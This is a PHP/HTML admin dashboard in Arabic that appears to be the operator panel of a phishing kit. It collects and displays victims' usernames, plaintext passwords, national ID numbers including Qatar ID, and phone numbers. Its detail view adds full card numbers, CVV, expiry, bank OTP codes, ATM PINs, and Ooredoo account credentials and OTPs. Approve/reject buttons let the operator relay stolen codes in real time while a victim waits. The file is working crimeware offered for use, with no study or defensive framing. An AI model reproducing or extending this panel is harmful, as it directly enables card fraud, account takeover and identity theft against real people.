<?php
session_start();
require_once '../includes/db.php';
require_once '../includes/functions.php';
if (!isset($_SESSION['admin_logged_in'])) { header("Location: login.php"); exit; }
$v = time(); // Version to bust cache
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم الإدارية</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <style>
        :root { --primary: #007bff; --bg: #f8f9fa; --card-bg: #ffffff; --text: #333; --border: #eee; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg); color: var(--text); direction: rtl; }
        
        /* Header - White Design */
        header { background: #fff; padding: 12px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 1000; }
        .logo-area { display: flex; align-items: center; gap: 12px; }
        .logo-area h1 { font-size: 18px; color: #333; font-weight: 700; }
        .status-badge { background: #e8f5e9; color: #2e7d32; padding: 4px 12px; border-radius: 4px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
        .status-dot { width: 6px; height: 6px; background: #4caf50; border-radius: 50%; }
        .logout-btn { background: #fff; border: 1px solid #ddd; padding: 6px 15px; border-radius: 5px; font-size: 12px; font-weight: 600; cursor: pointer; color: #333; }

        /* Stats - Colored Icons */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; padding: 25px 30px; }
        .stat-card { background: #fff; padding: 20px; border-radius: 8px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .stat-info h3 { font-size: 12px; color: #888; margin-bottom: 5px; font-weight: 600; }
        .stat-info p { font-size: 24px; font-weight: 700; color: #333; }
        .stat-icon { width: 45px; height: 45px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 20px; }

        /* Table - Clean Design */
        .content-area { padding: 0 30px 30px; }
        .table-card { background: #fff; border-radius: 8px; border: 1px solid var(--border); overflow: hidden; }
        .table-header { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .table-header h2 { font-size: 16px; font-weight: 700; color: #333; }
        .search-box { position: relative; width: 250px; }
        .search-box input { width: 100%; padding: 8px 12px 8px 35px; border: 1px solid #ddd; border-radius: 5px; outline: none; font-size: 13px; }
        .search-box i { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); color: #aaa; }

        table { width: 100%; border-collapse: collapse; }
        th { background: #fafafa; padding: 12px 20px; text-align: right; font-size: 12px; color: #666; font-weight: 700; border-bottom: 1px solid var(--border); }
        td { padding: 15px 20px; border-bottom: 1px solid #f9f9f9; font-size: 13px; text-align: right; color: #444; }
        tr:hover { background: #fcfcfc; }

        .badge { padding: 4px 10px; border-radius: 4px; font-size: 10px; font-weight: 700; }
        .badge-waiting { background: #fff3e0; color: #ef6c00; }
        .badge-approved { background: #e8f5e9; color: #2e7d32; }
        .badge-rejected { background: #ffebee; color: #c62828; }
        .badge-card { background: #e3f2fd; color: #1976d2; }
        .badge-otp { background: #f3e5f5; color: #7b1fa2; }
        .badge-atm { background: #fffde7; color: #fbc02d; }
        .badge-ooredoo { background: #ffebee; color: #d32f2f; }
        .badge-otp-ooredoo { background: #efebe9; color: #5d4037; }

        .action-btn { background: #007bff; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 11px; display: flex; align-items: center; gap: 5px; }

        /* Modal - Professional Design */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: none; align-items: center; justify-content: center; z-index: 2000; }
        .modal-content { background: #fff; width: 95%; max-width: 800px; border-radius: 10px; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .modal-header { padding: 15px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .modal-body { padding: 20px; }
        .data-section { margin-bottom: 20px; }
        .section-title { font-size: 12px; font-weight: 800; color: #007bff; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid #f0f0f0; }
        .data-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #fcfcfc; align-items: center; }
        .data-label { color: #888; font-size: 12px; }
        .data-value { font-weight: 600; color: #333; display: flex; align-items: center; gap: 8px; font-size: 12px; }
        .copy-icon { cursor: pointer; color: #007bff; font-size: 14px; }

        .modal-actions { display: flex; gap: 10px; margin-top: 20px; }
        .btn-approve { flex: 1; background: #2e7d32; color: #fff; border: none; padding: 12px; border-radius: 6px; font-weight: 700; cursor: pointer; }
        .btn-reject { flex: 1; background: #c62828; color: #fff; border: none; padding: 12px; border-radius: 6px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>
    <header>
        <div class="logo-area">
            <div style="background: #333; width: 32px; height: 32px; border-radius: 5px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 16px;"><i class="bi bi-gear-fill"></i></div>
            <h1>لوحة التحكم</h1>
        </div>
        <div style="display: flex; gap: 15px; align-items: center;">
            <div class="status-badge"><div class="status-dot"></div> متصل</div>
            <button class="logout-btn" onclick="location.href='logout.php'">تسجيل الخروج</button>
        </div>
    </header>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-info"><h3>إجمالي الزيارات</h3><p id="sTotal">0</p></div>
            <div class="stat-icon" style="background: #e3f2fd; color: #1976d2;"><i class="bi bi-people"></i></div>
        </div>
        <div class="stat-card">
            <div class="stat-info"><h3>بانتظار القرار</h3><p id="sNew">0</p></div>
            <div class="stat-icon" style="background: #fff3e0; color: #ef6c00;"><i class="bi bi-clock-history"></i></div>
        </div>
        <div class="stat-card">
            <div class="stat-info"><h3>تم القبول</h3><p id="sDone">0</p></div>
            <div class="stat-icon" style="background: #e8f5e9; color: #2e7d32;"><i class="bi bi-check-circle"></i></div>
        </div>
    </div>

    <div class="content-area">
        <div class="table-card">
            <div class="table-header">
                <h2>قائمة البيانات والعمليات</h2>
                <div class="search-box">
                    <i class="bi bi-search"></i>
                    <input type="text" id="srch" placeholder="بحث سريع..." oninput="filterRows()">
                </div>
            </div>
            <div style="overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>الدولة</th>
                            <th>اسم المستخدم</th>
                            <th>كلمة المرور</th>
                            <th>رقم الهوية</th>
                            <th>رقم الهاتف</th>
                            <th>آخر نشاط</th>
                            <th>الحالة</th>
                            <th>الإجراءات</th>
                        </tr>
                    </thead>
                    <tbody id="tBody"></tbody>
                </table>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="mTitle" style="font-size: 15px;">تفاصيل البيانات</h2>
                <i class="bi bi-x-lg" style="cursor: pointer; font-size: 16px;" onclick="closeModal()"></i>
            </div>
            <div class="modal-body" id="mBody"></div>
        </div>
    </div>

    <script>
        let rows = [];
        async function loadData() {
            try {
                const [b, s] = await Promise.all([
                    fetch('../api/admin/bookings.php?v=<?= $v ?>').then(r => r.json()),
                    fetch('../api/admin/stats.php?v=<?= $v ?>').then(r => r.json())
                ]);
                if (b.success) { rows = b.data; renderRows(rows); }
                if (s.success) {
                    document.getElementById('sTotal').innerText = s.data.total;
                    document.getElementById('sNew').innerText = s.data.new;
                    document.getElementById('sDone').innerText = s.data.completed;
                }
            } catch(e) {}
        }

        function renderRows(list) {
            document.getElementById('tBody').innerHTML = list.map(r => `
                <tr>
                    <td><span style="font-weight: 600;">${r.country}</span></td>
                    <td><b>${r.username}</b></td>
                    <td><code>${r.password || '••••••••'}</code></td>
                    <td>${r.clientId}</td>
                    <td>${r.clientPhone}</td>
                    <td><span style="color: #888; font-size: 11px;">${r.last_activity || '-'}</span></td>
                    <td>
                        <span class="badge badge-${r.status === 'بطاقة' ? 'card' : (r.status === 'OTP' ? 'otp' : (r.status === 'ATM' ? 'atm' : (r.status === 'Ooredoo' ? 'ooredoo' : (r.status === 'OTP Ooredoo' ? 'otp-ooredoo' : r.status))))}">
                            ${r.status === 'waiting' ? 'بانتظار القرار' : (r.status === 'approved' ? 'مقبول' : (r.status === 'rejected' ? 'مرفوض' : r.status))}
                        </span>
                    </td>
                    <td><button class="action-btn" onclick="openDetail('${r.referenceId}')"><i class="bi bi-eye"></i> تفاصيل</button></td>
                </tr>
            `).join('');
        }

        function filterRows() {
            const q = document.getElementById('srch').value.toLowerCase();
            renderRows(rows.filter(r => r.username.toLowerCase().includes(q) || r.clientId.includes(q) || r.clientPhone.includes(q) || r.country.toLowerCase().includes(q)));
        }

        async function openDetail(ref) {
            const d = await fetch(`../api/admin/bookings_detail.php?ref=${ref}&v=<?= $v ?>`).then(r => r.json());
            if (!d.success) return;
            const b = d.data;
            const all = b.allData || {};
            document.getElementById('mBody').innerHTML = `
                <div class="data-section">
                    <div class="section-title">البيانات الأساسية</div>
                    ${dRow("الدولة", b.country)}
                    ${dRow("اسم المستخدم", all.username)}
                    ${dRow("كلمة المرور", all.password)}
                    ${dRow("رقم الهوية", all.id_number || all.qatar_id)}
                    ${dRow("رقم الهاتف", all.phone_number)}
                    ${dRow("البريد الإلكتروني", all.email_confirm || all.email)}
                </div>
                <div class="data-section">
                    <div class="section-title">بيانات البطاقة</div>
                    ${dRow("رقم البطاقة", all.card_number)}
                    ${dRow("الاسم", all.card_name)}
                    ${dRow("الانتهاء", (all.exp_month || '') + '/' + (all.exp_year || ''))}
                    ${dRow("CVV", all.cvv)}
                </div>
                <div class="data-section">
                    <div class="section-title">رموز التحقق</div>
                    ${dRow("OTP البنك", all.otp)}
                    ${dRow("ATM PIN", all.atm_pin)}
                    ${dRow("Ooredoo User", all.ooredoo_user)}
                    ${dRow("Ooredoo Pass", all.ooredoo_pass)}
                    ${dRow("Ooredoo OTP", all.ooredoo_otp)}
                </div>
                <div class="modal-actions">
                    <button class="btn-approve" onclick="handleAction('${ref}', 'pass')">قبول وتوجيه</button>
                    <button class="btn-reject" onclick="handleAction('${ref}', 'deny')">رفض وإعادة</button>
                </div>
            `;
            document.getElementById('modal').style.display = 'flex';
        }

        function dRow(lbl, val) {
            let displayVal = val || '-';
            // تنسيق رقم البطاقة لمنع انعكاس المجموعات الرقمية في وضع RTL
            if (lbl === "رقم البطاقة" && val && val.length >= 15) {
                displayVal = val.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
            }
            return `<div class="data-row"><span class="data-label">${lbl}</span><span class="data-value" dir="ltr" style="direction:ltr;text-align:left;font-family:monospace;letter-spacing:1px;">${displayVal} <i class="bi bi-copy copy-icon" onclick="navigator.clipboard.writeText('${val}')"></i></span></div>`;
        }

        function closeModal() { document.getElementById('modal').style.display = 'none'; }

        async function handleAction(ref, action) {
            await fetch('../api/admin/payment-action.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ reference: ref, action: action })
            });
            closeModal(); loadData();
        }

        loadData();
        setInterval(loadData, 4000);
    </script>
</body>
</html>
